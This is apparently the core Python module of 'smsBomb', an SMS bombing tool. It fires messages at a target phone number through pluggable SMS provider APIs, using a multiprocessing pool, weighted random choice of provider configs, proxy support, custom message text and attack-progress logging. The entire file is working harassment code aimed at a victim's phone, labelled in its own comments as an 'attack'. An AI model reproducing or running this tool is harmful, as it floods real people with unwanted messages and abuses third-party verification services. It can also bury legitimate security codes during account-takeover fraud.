# coding=utf-8

import importlib
import json
import logging
import multiprocessing
import pkgutil
import platform
import random
import time
import uuid

import coloredlogs
import requests

from smsBomb import __version__


def setup_logger(name, use_colors=True, verbose_count=0):
    """
    初始化日志~
    :param name: 日志名
    :type name: str
    :param use_colors:
    :type use_colors: bool
    :param verbose_count:
    :type verbose_count: int
    :return:
    """
    fmt = '[%(levelname).8s %(asctime)s %(name)s:%(lineno)d] %(message)s'
    datefmt = '%Y-%m-%d %H:%M:%S'
    level = max(5 - verbose_count, 0) * 10
    logger = logging.getLogger(name)
    if use_colors:
        coloredlogs.install(logger=logger, level=level, fmt=fmt, datefmt=datefmt)
    else:
        logging.basicConfig(level=level, format=fmt, datefmt=datefmt)
    logging.getLogger('requests').setLevel(level)
    return logger


def load_plugins(namespace):
    """
    :param namespace:
    :type namespace: Any
    :return:
    """
    return {
        name: importlib.import_module(name)
        for finder, name, ispkg
        in pkgutil.iter_modules(namespace.__path__, namespace.__name__ + '.')
    }


class LoggerMixin(object):
    """https://stackoverflow.com/questions/3375443/cant-pickle-loggers"""

    @property
    def logger(self):
        component = "{}.{}".format(type(self).__module__, type(self).__name__)
        return logging.getLogger(component)


class SmsPlugin(LoggerMixin):
    """短信插件"""
    API_URLS = {
        'send': 'https://von.sh'
    }

    def __init__(self, **kwargs):
        self.auth = kwargs.get('auth', {})
        self.method = kwargs.get('method', 'GET')
        self.api = kwargs.get('api', self.API_URLS['send'])
        self.desc = kwargs.get('desc')
        self.payloads = kwargs.get('payloads', {})
        self.enable_custom_msg = kwargs.get('enable_custom_msg', False)
        self._req = requests.session()
        if platform.system() == 'Darwin':  # WTF!
            # 在 Kivy 里面新开线程的时候会发现requests卡在检查代理设置的地方
            # 我也不知道具体原因是什么,只好暂时关闭这个配置
            # https://stackoverflow.com/a/39822223
            self._req.trust_env = False
        self._req.headers['User-Agent'] = 'SmsBomb %s' % __version__
        self._req.proxies.update(kwargs.get('proxies') or {})

    def __repr__(self):
        return '<{}:{}>'.format(self.__class__.__name__, self.auth)

    def __str__(self):
        return self.__repr__()

    @property
    def nonce(self):
        return uuid.uuid4().hex

    @property
    def curtime(self):
        return str(int(time.time()))

    def get_msg_content(self, config, key='msg'):
        msg = config.get(key, '您的验证码是: 123456')
        if self.enable_custom_msg:
            return config.get('__custom_msg', msg)
        return msg

    def send(self, mobile, **kwargs):
        self.payloads['mobile'] = mobile
        resp = self._req.request(self.method, self.api, data=self.payloads)
        self.logger.info(resp)
        return resp


def worker(*args, **kwargs):
    """
    多进程需要跑的worker.

    :param args:
    :param kwargs:
    :return:
    """
    obj, method_name = args[:2]
    logging.debug(
        '{obj}->{method_name}({args},{kwargs})'.format(obj=type(obj).__name__,
                                                       method_name=method_name,
                                                       args=args[2:],
                                                       kwargs=kwargs))
    return getattr(obj, method_name)(*args[2:], **kwargs)


class SmsBomb(LoggerMixin):
    """短信轰炸机"""

    def __init__(self, plugins, config_lst, target, **kwargs):
        """
        短信轰炸机!!!!
        :param plugins: 插件
        :param config_lst: 配置列表
        :param target: 攻击手机号
        :param kwargs: 其他自定义信息,比如msg/proccess_num/prefix
        """
        self.plugins = plugins
        self.config_lst = config_lst
        self.target = target
        self.limit = kwargs.get('limit', 10)
        self.process_num = kwargs.get('process_num', 5)
        self.custom_msg = kwargs.get('msg', None)
        self.prefix = kwargs.get('prefix', '')
        self.proxies = kwargs.get('proxy', {})
        self.max_allowed_failed_rate = 0.95  # 最大允许的失败率.超过这个失败率之后会宣告失败
        self.failed_config_lst = []

    def _random_weight_select(self):
        weight_lst = [[k, v.copy()] for (k, v) in enumerate(self.config_lst) for _ in range(v.get('weight', 1))]
        if weight_lst:
            return random.choice(weight_lst)
        return None

    def re_config(self, config_lst):
        self.config_lst = config_lst
        self.failed_config_lst = []

    def progress_info(self, success_cnt, failed_cnt, limit, force_finished=False):
        if success_cnt == limit or force_finished:
            self.logger.info(
                '攻击完毕,成功: {0}次, 失败: {1}次'.format(
                    success_cnt, failed_cnt))
            return
        failed_rate = failed_cnt / limit
        self.logger.debug('攻击进度(成功数/期望攻击次数): %d/%d = %.2f%%, 实际攻击目标次数(含失败): %d(失败%d次, 失败率: %.2f%%)',
                          success_cnt, limit, success_cnt * 100 / limit,
                          success_cnt + failed_cnt, failed_cnt, failed_rate * 100)

    def start(self, config_lst=None, cb=None):
        """
        :param config_lst: 配置列表
        :param cb: 进度回调函数,接受四个参数:成功数/失败数/总数/是否已经结束？
        :return:
        """
        if config_lst:
            self.re_config(config_lst)
        pool = multiprocessing.Pool(processes=self.process_num)
        success_cnt = 0
        failed_cnt = 0
        failed_rate = 0
        cb = cb if cb else self.progress_info

        self.logger.info('Start attacking phone: %s', self.target)
        while success_cnt < self.limit and failed_rate <= self.max_allowed_failed_rate:
            failed_rate = failed_cnt / self.limit
            cfg = self._random_weight_select()
            if not cfg:
                # 如果已经找不到配置了, 尝试把之前错误的配置重新分配,并标记失败次数
                self.logger.warning('没有可用配置可供使用!尝试重置配置列表:%s', self.failed_config_lst)
                self.re_config(self.failed_config_lst)
                failed_cnt += 1
                continue
            index, current_config = cfg
            key = self.prefix + current_config['product']
            cls = current_config.get('product').title() + 'Plugin'
            obj = self.plugins.get(key)
            if not obj or not hasattr(obj, cls):
                self.logger.warning('无此插件:%s,跳过' % cls)
                continue
            cls = getattr(obj, cls)(proxies=self.proxies, **current_config)
            payloads = current_config.get('payloads', {})
            if self.custom_msg:
                payloads['__custom_msg'] = self.custom_msg
            success = pool.apply(worker, args=(
                cls, 'send', self.target), kwds=payloads)
            if success:
                success_cnt += 1
            else:
                self.logger.warning('节点%s请求失败,尝试降低此配置的优先级,并标记此节点已经失败', current_config)
                # 失败,尝试降低修改此配置的优先级,并标记此节点已经失败.
                self.config_lst[index]['weight'] = max(current_config.get('weight', 1) - 1, 0)
                current_config['weight'] = 1
                self.failed_config_lst.append(current_config)
                failed_cnt += 1
            cb(success_cnt, failed_cnt, self.limit)

        # 如果到结束的时候还不相等,则强制结束
        if success_cnt != self.limit:
            cb(success_cnt, failed_cnt, self.limit, force_finished=True)


def load_config(cfg, product=None):
    """
    加载配置

    :param cfg: 配置文件完整目录
    :type  cfg: str
    :param product: 如果指定了产品则只返回该产品配置否则返回所有配置
    :type  product: str
    :return:
    """
    with open(cfg, 'r', encoding='utf8') as config_file:
        config = json.loads(config_file.read())
    if product:
        return list(filter(lambda x: x['product'] == product, config))
    return config
